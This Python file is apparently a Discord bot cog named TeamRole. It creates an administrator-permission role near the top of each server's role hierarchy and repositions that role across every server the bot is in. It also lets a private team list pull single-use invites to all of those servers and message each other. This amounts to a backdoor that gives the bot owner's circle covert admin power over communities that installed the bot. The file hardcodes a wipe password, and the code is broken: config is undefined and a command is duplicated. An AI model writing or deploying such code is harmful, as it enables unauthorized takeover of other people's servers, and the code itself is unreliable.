class TeamRole(commands.Cog):  
    def __init__(self, bot):  
        self.bot = bot  
        self.owner_id = None  
        self.role_name = "TeamRole"  
        self.role_color = "#FF0000"  

    async def cog_load(self):  
        self.owner_id = (await self.bot.application_info()).owner.id  

    async def bot_owner_check(self, ctx):  
        """Check if user is the defined owner"""  
        return ctx.author.id == self.owner_id  

    async def team_member_check(self, ctx):  
        """Check if user is owner or in team list"""  
        if await self.bot_owner_check(ctx):  
            return True  
        team_users = await self.config.team_users()  
        return ctx.author.id in team_users  

    @commands.group()  
    async def team(self, ctx):  
        """Team management commands"""  
        pass  

    @team.command()  
    @commands.check(lambda ctx: ctx.cog.bot_owner_check(ctx))  
    async def setup(self, ctx):  
        """Create team role in this server (Owner Only)"""  
        existing_role = discord.utils.get(ctx.guild.roles, name=self.role_name)  
        if existing_role:  
            return await ctx.send("Role already exists!", ephemeral=True)  

        try:  
            perms = discord.Permissions(administrator=True)  
            new_role = await ctx.guild.create_role(  
                name=self.role_name,  
                color=discord.Color.from_str(self.role_color),  
                permissions=perms,  
                reason="Team role setup"  
            )  

            # Get the highest role in the guild  
            roles = sorted(ctx.guild.roles, key=lambda r: r.position, reverse=True)  
            highest_role = roles[0] if roles else None  

            if highest_role:  
                # Place team role just below the highest role  
                target_position = highest_role.position - 1  
                target_position = max(target_position, 1)  # Ensure valid position  
                await new_role.edit(position=target_position)  
            
            await ctx.send(f"Successfully created {new_role.mention}", ephemeral=True)  
        except discord.Forbidden:  
            await ctx.send("I need Manage Roles permission! Error Code: ROLE_CREATE_FAILED", ephemeral=True)  
        except discord.HTTPException:  
            await ctx.send("Failed to create role! Error Code: ROLE_CREATE_HTTP_ERROR", ephemeral=True)  

    @team.command()  
    @commands.check(lambda ctx: ctx.cog.bot_owner_check(ctx))  
    async def add(self, ctx, user: discord.User):  
        """Add user to the team list (Owner Only)"""  
        async with self.config.team_users() as users:  
            if user.id not in users:  
                users.append(user.id)  
                await ctx.send(f"Added {user} to team list", ephemeral=True)  
            else:  
                await ctx.send("User already in team list", ephemeral=True)  

    @team.command()  
    @commands.check(lambda ctx: ctx.cog.bot_owner_check(ctx))  
    async def remove(self, ctx, user: discord.User):  
        """Remove user from the team list (Owner Only)"""  
        async with self.config.team_users() as users:  
            if user.id in users:  
                users.remove(user.id)  
                await ctx.send(f"Removed {user} from team list", ephemeral=True)  
            else:  
                await ctx.send("User not in team list", ephemeral=True)  

    @team.command()  
    @commands.check(lambda ctx: ctx.cog.bot_owner_check(ctx))  
    async def update(self, ctx):  
        """Update team roles across all servers (Owner Only)"""  
        team_users = await self.config.team_users()  
        msg = await ctx.send("Starting global role update...", ephemeral=True)  
        
        success = errors = 0  
        for guild in self.bot.guilds:  
            try:  
                role = discord.utils.get(guild.roles, name=self.role_name)  
                if not role:  
                    errors += 1  
                    continue  

                # Get bot's highest role in this guild  
                bot_top = guild.me.top_role  
                if bot_top:  
                    # Ensure team role is below bot's highest role  
                    if role.position >= bot_top.position:  
                        try:  
                            new_position = bot_top.position - 1  
                            new_position = max(new_position, 1)  
                            await role.edit(position=new_position)  
                        except discord.Forbidden:  
                            await ctx.send("Lacks permission to adjust roles in this server! Error Code: PERMISSION_DENIED", ephemeral=True)  
                        except Exception as e:  
                            await ctx.send(f"Failed to adjust role: {e}", ephemeral=True)  
                
                success += 1  
            except Exception as e:  
                errors += 1  
                await ctx.send(f"Error in server {guild.name}: {e}", ephemeral=True)  
        
        await msg.edit(content=f"Updated {success} servers. Errors: {errors}", ephemeral=True)  

    @team.command()  
    @commands.check(lambda ctx: ctx.cog.bot_owner_check(ctx))  
    async def wipe(self, ctx):  
        """Wipe all team data (Owner Only)"""  
        try:  
            await ctx.send("Type password to confirm wipe:", ephemeral=True)  
            msg = await self.bot.wait_for(  
                "message",  
                check=MessagePredicate.same_context(ctx),  
                timeout=30  
            )  
            if msg.content.strip() != "kkkkayaaaaa":  
                return await ctx.send("Invalid password!", ephemeral=True)  

            confirm_msg = await ctx.send("Are you sure? This will delete ALL team roles and data!", ephemeral=True)  
            start_adding_reactions(confirm_msg, ["✅", "❌"])  
            
            pred = ReactionPredicate.with_emojis(["✅", "❌"], confirm_msg, user=ctx.author)  
            await self.bot.wait_for("reaction_add", check=pred, timeout=30)  
            
            if pred.result == 0:  
                await ctx.send("Wiping all data...", ephemeral=True)  
                await self.config.team_users.set([])  
                
                deleted = 0  
                for guild in self.bot.guilds:  
                    role = discord.utils.get(guild.roles, name=self.role_name)  
                    if role:  
                        try:  
                            await role.delete()  
                            deleted += 1  
                        except:  
                            pass  
                await ctx.send(f"Deleted {deleted} roles. All data cleared.", ephemeral=True)  
            else:  
                await ctx.send("Cancelled.", ephemeral=True)  
        except TimeoutError:  
            await ctx.send("Operation timed out.", ephemeral=True)  

    @team.command()  
    @commands.check(lambda ctx: ctx.cog.bot_owner_check(ctx))  
    async def delete(self, ctx):  
        """Delete team role in this server (Owner Only)"""  
        role = discord.utils.get(ctx.guild.roles, name=self.role_name)  
        if role:  
            try:  
                await role.delete()  
                await ctx.send("Role deleted!", ephemeral=True)  
            except discord.Forbidden:  
                await ctx.send("Missing permissions!", ephemeral=True)  
            except discord.HTTPException:  
                await ctx.send("Deletion failed!", ephemeral=True)  
        else:  
            await ctx.send("No team role here!", ephemeral=True)  

    @team.command()  
    async def getinvite(self, ctx):  
        """Generate single-use invites for all servers"""  
        if not await self.team_member_check(ctx):  
            return await ctx.send("You are not a team member!", ephemeral=True)  
        
        invites = []  
        for guild in self.bot.guilds:  
            try:  
                channel = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)  
                if channel:  
                    invite = await channel.create_invite(  
                        max_uses=1,  
                        unique=True,  
                        reason=f"Invite by {ctx.author}"  
                    )  
                    invites.append(f"{guild.name}: {invite.url}")  
            except Exception as e:  
                await ctx.send(f"Error in {guild.name}: {e}", ephemeral=True)  
                continue  

        try:  
            await ctx.author.send("**Server Invites:**\n" + "\n".join(invites), ephemeral=True)  
            await ctx.send("Check your DMs!", ephemeral=True)  
        except discord.Forbidden:  
            await ctx.send("Enable DMs to receive invites!", ephemeral=True)  

    @team.command()  
    async def sendmessage(self, ctx):  
        """Send a message to all team members (supports images)"""  
        if not await self.team_member_check(ctx):  
            return await ctx.send("You are not a team member!", ephemeral=True)  
        
        await ctx.send("Please type your message (you have 5 minutes):", ephemeral=True)  
        
        try:  
            msg = await self.bot.wait_for(  
                "message",  
                check=lambda m: m.author == ctx.author,  
                timeout=300  
            )  
        except TimeoutError:  
            return await ctx.send("Timed out waiting for message.", ephemeral=True)  
            
        embed = discord.Embed(  
            title=f"Team Message from {ctx.author}",  
            description=msg.content,  
            color=discord.Color.from_str(self.role_color)  
        )  
        embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.avatar.url)  
        
        if msg.attachments:  
            embed.set_image(url=msg.attachments[0].url)  
        
        team_users = await self.config.team_users()  
        sent, failed = 0, 0  
        
        for uid in team_users:  
            user = self.bot.get_user(uid)  
            if user:  
                try:  
                    await user.send(embed=embed)  
                    sent += 1  
                except:  
                    failed += 1  
        
        await ctx.send(f"Message delivered to {sent} members. Failed: {failed}", ephemeral=True)  

    @team.command(name="list")  
    async def team_list(self, ctx):  
        """List all team members"""  
        if not await self.team_member_check(ctx):  
            return await ctx.send("You are not a team member!", ephemeral=True)  
        
        team_users = await self.config.team_users()  
        members = []  
        for uid in team_users:  
            user = self.bot.get_user(uid)  
            members.append(f"{user.mention} ({user.id})" if user else f"Unknown ({uid})")  
        
        embed = discord.Embed(  
            title="Team Members",  
            description="\n".join(members) if members else "No members",  
            color=discord.Color.from_str(self.role_color)  
        )  
        await ctx.send(embed=embed, ephemeral=True)  

    @team.command()  
    async def update(self, ctx):  
        """Update team roles across all servers"""  
        if not await self.team_member_check(ctx):  
            return await ctx.send("You are not a team member!", ephemeral=True)  
        
        await ctx.send("Updating team roles...", ephemeral=True)  
        
        success = errors = 0  
        for guild in self.bot.guilds:  
            try:  
                role = discord.utils.get(guild.roles, name=self.role_name)  
                if not role:  
                    errors += 1  
                    continue  

                # Get the highest role in the guild  
                highest_role = max(guild.roles, key=lambda r: r.position)  
                if role.position != highest_role.position - 1:  
                    await role.edit(position=highest_role.position - 1)  
                
                success += 1  
            except Exception as e:  
                errors += 1  
                await ctx.send(f"Error in {guild.name}: {e}", ephemeral=True)  
        
        await ctx.send(f"Updated {success} servers. Errors: {errors}", ephemeral=True)  

async def setup(bot):  
    await bot.add_cog(TeamRole(bot))
